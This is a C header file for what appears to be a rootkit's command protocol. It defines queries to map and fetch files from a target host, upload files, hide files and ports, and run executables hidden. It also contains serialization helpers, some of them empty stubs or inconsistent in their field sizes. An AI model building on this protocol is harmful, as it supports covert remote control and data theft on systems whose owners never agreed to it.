#ifndef __UTILS_H__
#define __UTILS_H__

#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <ctype.h>
#include <assert.h>
#include <stdalign.h>

#define RED(x)      "\x1b[31m" x "\x1b[0m"  
#define GREEN(x)    "\x1b[32m" x "\x1b[0m" 
#define YELLOW(x)   "\x1b[33m" x "\x1b[0m"  
#define MAGENTA(x)  "\x1b[35m" x "\x1b[0m"  
#define CYAN(x)     "\x1b[36m" x "\x1b[0m" 
#define BOLD(x)     "\x1b[1m" x "\x1b[0m"

#define check_unaligned(p, T)       (((ulong)p % alignof(T)) == 0)  

/**
 * QUERY FORMAT
 * 
 * |    query type    |   paramsize   |   param
 * | sizeof(int32_t)  | sizeof(size_t)| sizeof(char) * paramsize
 * 
 * specifications:
 *  paramsize <= QUERY_BUF_LEN
 * 
 * 
 * ANSWER FORMAT
 * 
 * QUERY_GET_FSM:
 * |    len           |   nfiles        |   files
 * | sizeof(uint64_t) | sizeof(int32_t)| sizeof(char) * len
 * 
 * QUERY_GET_FILE:
 * |    len           |   content
 * | sizeof(uint64_t) | sizeof(char) * len
 * 
 * QUERY_GET_FSM_DIR:
 * |    len           |   content
 * | sizeof(uint64_t) | sizeof(char) * len
 * 
 * 
 * 
 */
#define QUERY_GET_FSM       (int32_t) 1
#define QUERY_GET_FILE      (int32_t) 2
#define QUERY_GET_FSM_DIR   (int32_t) 3
#define QUERY_UPLOAD_FILE   (int32_t) 4
#define QUERY_HIDE_AND_RUN  (int32_t) 5

#define QUERY_BUF_LEN       sizeof(uint64_t) + sizeof(size_t) + PATH_MAX

const char *query_type[] = {
    "UNKNOWN",
    "GET_SYSTEM_FILE_MAPPING",
    "GET_FILE",
    "GET_FILE_MAPPING_DIR",
    "UPLOAD_FILE",
    "HIDE_AND_RUN_EXECUTABLE",
    NULL
};

#define MAX_QUERY_ERROR             5
#define QUERY_SUCCESS               MAX_QUERY_ERROR + 1   

/**
 * Serialized structs representation in payload
 * 
 * upload_params:
 * |    dir     |  filename  |    flags    |       len      |            content           |
 * |            |            |             |                |                              |     
 * | PATH_MAX+1 | NAME_MAX+1 | sizeof(int) | sizeof(size_t) | sizeof(unsigned char) * size | 
 *
 * hare_params:
 * |            cmd_line_args            |  nb_hports  |         hports          |  log_outerr  |     u_params      |
 * |     nelems     |        args        |             |                         |              |                   |
 * | sizeof(size_t) | nelems * C strings | sizeof(int) | nb_hports * sizeof(int) | sizeof(bool) | see upload_params |
 *                     (null terminated)
 */

/**
 * @struct upload file query params 
 */
typedef struct __upload_params {
    char dir[PATH_MAX+1];
    char filename[NAME_MAX+1];
    int flags;                      // flags determining mode of the uploaded file
    bool hidden;                    // determine if the file need to be hidden by the rootkit
    long len;
    unsigned char *content;
} upload_params;

/**
 * @struct Hide And Run Executable query params
 */
typedef struct __hare_params {
    char **cmd_line_args;           // == argv, argv[0] must be equal to u_params.filename, and cmd_line_args need to be NULL terminated
    int nb_hports;
    int *hports;
    bool log_outerr;                // if true, redirect stdout & stderr to a file called log_%s.txt, with %s=u_params.filename, and 
                                    // if u_params.hidden = true this log file will be hidden too
    upload_params *u_params;
} hare_params;

size_t 
get_hare_params_mem_size(hare_params *p)
{
    if (!p)
        return 0;
    size_t size = 0;
    return size;
}

size_t 
get_upload_params_mem_size(upload_params *p)
{
    if (!p)
        return 0;

    size_t size = 0;
    size += PATH_MAX+1;
    size += NAME_MAX+1;
    size += p->len;
    size += sizeof(int);
    size += sizeof(bool);
    size += sizeof(long);

    return size;
}

void *
mem_alloc(size_t size)
{
    void *ptr = malloc(size);
    if (!ptr)
    {
        perror("malloc");
        exit(1);
    }
    return ptr;
}

unsigned char *
serialize_upload_params(upload_params *p, size_t *ret_len)
{
    size_t len = get_upload_params_mem_size(p);
    unsigned char *buf = mem_alloc(sizeof(unsigned char) * len);
    memcpy(buf, p->dir, PATH_MAX);
    buf[PATH_MAX] = 0;
    unsigned char *tmp = buf + PATH_MAX + 1;
    memcpy(tmp, p->filename, NAME_MAX);
    tmp[NAME_MAX] = 0;
    tmp += NAME_MAX + 1;
    *(int*) tmp = p->flags;
    tmp += sizeof(int);
    *(bool*) tmp = p->hidden;
    tmp += sizeof(bool);
    *(long*) tmp = p->len;
    tmp += sizeof(long);
    memcpy(tmp, p->content, p->len);

    assert(tmp <= buf+len);
    *ret_len = len;
    return buf;
}

unsigned char *
serialize_hare_params(hare_params *p, size_t *ret_len)
{
    if (!p)
        return NULL;
    
    return NULL;
}


upload_params *
get_upload_params_from_serialized(unsigned char *buf, size_t buflen)
{
    upload_params tmpup = { .len = 0 };
    if (get_upload_params_mem_size(&tmpup) > buflen)
        return NULL;
    upload_params *p = malloc(sizeof(upload_params));
    if (!p)
        return NULL;
    unsigned char *tmp = buf;
    memcpy(p->dir, tmp, PATH_MAX);
    tmp += PATH_MAX +1;
    memcpy(p->filename, tmp, NAME_MAX);
    tmp += NAME_MAX +1;
    if (!check_unaligned(tmp, int))
    {
        fprintf(stderr, "Unaligned int at addr %p !\n", tmp);
    }
    p->flags = *(int*) tmp;
    tmp += sizeof(int);
    if (!check_unaligned(tmp, bool))
    {
        fprintf(stderr, "Unaligned bool at addr %p !\n", tmp);
    }
    p->hidden = *(bool*) tmp;
    tmp += sizeof(bool);
    if (!check_unaligned(tmp, size_t))
    {
        fprintf(stderr, "Unaligned size_t at addr %p !\n", tmp);
    }
    p->len = *(size_t*) tmp;
    tmp += sizeof(size_t);
    p->content = malloc(sizeof(unsigned char) * p->len);
    if (!p->content)
    {
        free(p);
        return NULL;
    }
    if ((tmp+p->len) > buf+buflen)
    {
        free(p);
        return NULL;
    }
    for (int i=0; i<p->len; i++)
        p->content[i] = tmp[i];
    //memcpy(p->content, tmp, p->len);

    return p;
}

hare_params *
get_hare_params_from_serialized(unsigned char *buf, size_t buflen)
{
    return NULL;
}

void
free_upload_params(upload_params *p)
{
    if (p)
    {
        if (p->content)
            free(p->content);
        free(p);
    }
}

int flush_in(FILE *file)
{
    int ch;
    int flags;
    int fd;

    fd = fileno(file);
    flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0) {
        return -1;
    }
    if (fcntl(fd, F_SETFL, flags | O_NONBLOCK)) {
        return -1;
    }
    do {
        ch = fgetc(file);
    } while (ch != EOF);
    clearerr(file);
    if (fcntl(fd, F_SETFL, flags)) {
        return -1;
    }
    return 0;
}

bool
isnumber(const char *s)
{
    if (strlen(s) == 0)
        return false;

    for (size_t i = 0; i < strlen(s); i++)
    {
        if (!isdigit(s[i]))
            return false;
    }
    return true;
}

size_t
read_until_char(int fd, 
                char *buffer, 
                size_t sizeofbuff, 
                char until)
{
    int nbReaded = -1, on_exit = 0;
    size_t cnt = 0;
    char c;
    while ((nbReaded = read(fd, &c, 1)) == 1)
    {

        if (c == until)
        {
            buffer[cnt] = '\0';
            on_exit = 1;
        }
        else
        {
            buffer[cnt] = c;
            cnt++;
        }

        if (cnt+1 == sizeofbuff && !on_exit)
        {
            // cannot read more
            buffer[cnt] = '\0';
            on_exit = 1;
        }
        if (on_exit)
            break;
    }

    return cnt;
}

#endif

/** GLOBAL UTILS **/

typedef unsigned int uint;

void
shift_str_left(char *s, size_t pos)
{
    size_t i;
    for (i = pos+1; i <= strlen(s); i++)
    {
        s[i-1] = s[i]; 
    }
}

void
shift_array_left(void *arr, size_t elemSize, unsigned int nbElem, unsigned int idxFrom)
{
    memmove(arr+idxFrom*elemSize, arr+(idxFrom+1)*elemSize, (nbElem-1-idxFrom) * elemSize);
    memset(arr+(nbElem-1)*elemSize, 0, elemSize);
}

void
trim(char *s)
{
    int trimed = 0;
    while (!trimed)
    {
        switch (s[0])
        {
        case '\t':
        case '\n':
        case ' ':
            shift_str_left(s, 0);
            break;
        
        default:
            trimed = 1;
            break;
        }
    }
    trimed = 0;

    while (!trimed)
    {
        switch (s[strlen(s)-1])
        {
        case '\n':
        case ' ':
        case '\t':
            s[strlen(s)-1] = 0;
            break;
        
        default:
            trimed = 1;
            break;
        }
    }
}